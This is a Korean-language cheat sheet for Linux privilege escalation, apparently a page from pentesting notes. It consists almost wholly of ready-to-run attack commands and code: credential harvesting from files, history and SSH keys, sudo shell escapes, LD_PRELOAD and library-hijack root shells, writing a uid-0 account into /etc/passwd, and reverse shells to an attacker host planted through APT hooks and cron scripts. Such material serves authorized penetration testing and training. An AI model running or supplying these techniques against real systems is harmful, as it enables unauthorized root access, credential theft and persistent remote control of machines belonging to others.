---
sidebar_position: 1
---

# Linux Privilege Escalation

Linux 시스템에서의 권한 상승 기법입니다.

## 기본 열거

```bash
# 현재 사용자 정보
id
whoami

# sudo 권한 확인
sudo -l

# 환경 변수
env
printenv

# bashrc/bash_profile
cat ~/.bashrc
cat ~/.bash_profile
cat /etc/profile

# 사용자 계정
cat /etc/passwd
cat /etc/shadow  # root만 가능

# 그룹
cat /etc/group
groups

# 호스트 정보
cat /etc/hosts
hostname

# 파일 시스템
cat /etc/fstab
mount
df -h

# 블록 디바이스
lsblk

# Cron 작업
ls -lah /etc/cron*
crontab -l
sudo crontab -l
crontab -u <USERNAME> -l
grep "CRON" /var/log/syslog
cat /etc/crontab

# 네트워크
ss -tulpn
netstat -tulpn
ip addr
ifconfig

# 프로세스
ps -auxf
ps aux
ps -ef

# 시스템 정보
uname -a
cat /etc/os-release
cat /etc/issue
lsb_release -a

# 설치된 패키지
dpkg -l  # Debian/Ubuntu
rpm -qa  # RedHat/CentOS
```

## SUID/SGID 파일

```bash
# SUID 파일 찾기
find / -perm -4000 2>/dev/null
find / -type f -user root -perm -4000 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# SGID 파일 찾기
find / -perm -2000 2>/dev/null

# SUID + SGID 모두
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null

# 일반적인 SUID 바이너리
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/su
```

## Capabilities

```bash
# Capabilities 확인
capsh --print

# 파일 Capabilities 찾기
/usr/sbin/getcap -r / 2>/dev/null
getcap -r / 2>/dev/null

# 일반적으로 위험한 Capabilities
# cap_setuid
# cap_dac_override
# cap_dac_read_search
```

## 쓰기 가능한 파일/디렉토리

```bash
# 쓰기 가능한 디렉토리
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null

# 쓰기 가능한 파일
find / -writable -type f 2>/dev/null

# /etc 내 쓰기 가능한 파일
find /etc -writable -type f 2>/dev/null
```

## 자격증명 수집

```bash
# 비밀번호 검색
grep -R "password" / 2>/dev/null
grep -R db_passwd / 2>/dev/null
grep -roiE "password.{20}" / 2>/dev/null
grep -oiE "password.{20}" /etc/*.conf

# 히스토리
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.psql_history

# SSH 키
find / -name id_rsa 2>/dev/null
find / -name id_dsa 2>/dev/null
find / -name authorized_keys 2>/dev/null

# 설정 파일
find /var/www -name "*.php" -exec grep -i "password\|passwd" {} \; 2>/dev/null
find / -name config.php 2>/dev/null
find / -name wp-config.php 2>/dev/null

# 실시간 프로세스 모니터링
watch -n 1 "ps -aux | grep pass"

# 네트워크 트래픽 캡처
sudo tcpdump -i lo -A | grep "pass"
```

## CentOS

```bash
# doas를 이용한 권한 상승
doas -u <USERNAME> /bin/sh
doas -u root /bin/bash
```

## sudo 악용

### sudo -l 확인

```bash
sudo -l

# (ALL : ALL) ALL - 모든 명령어 가능
# (root) NOPASSWD: /usr/bin/find - find를 비밀번호 없이 root로 실행
```

### GTFOBins

```bash
# find
sudo find . -exec /bin/sh \; -quit

# vim
sudo vim -c ':!/bin/sh'

# less
sudo less /etc/profile
!/bin/sh

# python
sudo python -c 'import os; os.system("/bin/sh")'

# perl
sudo perl -e 'exec "/bin/sh";'

# awk
sudo awk 'BEGIN {system("/bin/sh")}'
```

## PATH Hijacking

```bash
# sudo -l에서 NOPASSWD 확인
sudo -l

# 환경 변수가 유지되는지 확인
# env_keep+=LD_PRELOAD
# env_keep+=LD_LIBRARY_PATH

# PATH에 현재 디렉토리 추가
echo $PATH
export PATH=.:$PATH

# 악성 바이너리 생성
echo '/bin/bash' > <BINARY_NAME>
chmod +x <BINARY_NAME>

# 실행
sudo ./<BINARY_NAME>
```

## LD_PRELOAD

### shell.c

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

### 컴파일

```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

### 권한 상승

```bash
sudo LD_PRELOAD=/path/to/shell.so <BINARY>
```

## LD_LIBRARY_PATH

### shell.c

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
    unsetenv("LD_LIBRARY_PATH");
    setgid(0);
    setuid(0);
    system("/bin/bash -p");
}
```

### 컴파일

```bash
# 라이브러리 확인
ldd /usr/sbin/<BINARY>

# 컴파일
gcc -o <LIBRARY>.so.<VERSION> -shared -fPIC shell.c

# 실행
sudo LD_LIBRARY_PATH=. <BINARY>
```

## Bash 취약점

### Bash Debugging Mode

```bash
# Bash < 4.4
env -i SHELLOPTS=xtrace PS4='$(chmod +s /bin/bash)' /usr/local/bin/<BINARY>
```

### Bash Functions

```bash
# Bash < 4.2-048
function /usr/sbin/<BINARY> { /bin/bash -p; }
export -f /usr/sbin/<BINARY>
/usr/sbin/<BINARY>
```

## 비밀번호 인증 악용

```bash
# /etc/passwd에 새 사용자 추가
openssl passwd <PASSWORD>
# 출력: FgKl.eqJO6s2g

echo "root2:FgKl.eqJO6s2g:0:0:root:/root:/bin/bash" >> /etc/passwd
su root2
```

## 특정 바이너리 악용

### Apache2

```bash
# apache2로 파일 첫 줄 읽기
sudo /usr/sbin/apache2 -f /etc/shadow
sudo /usr/sbin/apache2 -f /root/.ssh/id_rsa
```

### APT

```bash
# APT Pre-Invoke 훅 악용
echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f"};' > /etc/apt/apt.conf.d/shell

sudo apt update
```

### aria2c

```bash
# authorized_keys 덮어쓰기
aria2c -d /root/.ssh/ -o authorized_keys "http://<LHOST>/authorized_keys" --allow-overwrite=true
```

## Kernel Exploits

```bash
# 커널 버전 확인
uname -a
cat /proc/version

# 익스플로잇 검색
searchsploit linux kernel <VERSION>

# 일반적인 Kernel Exploits
# DirtyCow (CVE-2016-5195)
# PwnKit (CVE-2021-4034)
```

## Cron Jobs

```bash
# Cron 파일 확인
ls -la /etc/cron*
cat /etc/crontab
crontab -l

# 쓰기 가능한 Cron 스크립트 찾기
find /etc/cron* -writable 2>/dev/null

# Cron 스크립트에 리버스 쉘 삽입
echo 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' >> /path/to/script.sh
```

## NFS

```bash
# NFS 공유 확인
cat /etc/exports

# no_root_squash가 설정된 경우
# LHOST에서:
mkdir /tmp/nfs
mount -o rw,vers=3 <RHOST>:/share /tmp/nfs
cd /tmp/nfs

# SUID 바이너리 생성
cat > shell.c << EOF
#include <unistd.h>
int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
EOF

gcc shell.c -o shell
chmod +s shell

# RHOST에서:
/share/shell
```

## 참고

- **GTFOBins**: https://gtfobins.github.io/
- **LinPEAS**: 자동화된 Linux 권한 상승 스크립트
- **LinEnum**: Linux 열거 스크립트
- 항상 여러 벡터 확인
- 자동화 도구와 수동 점검 병행
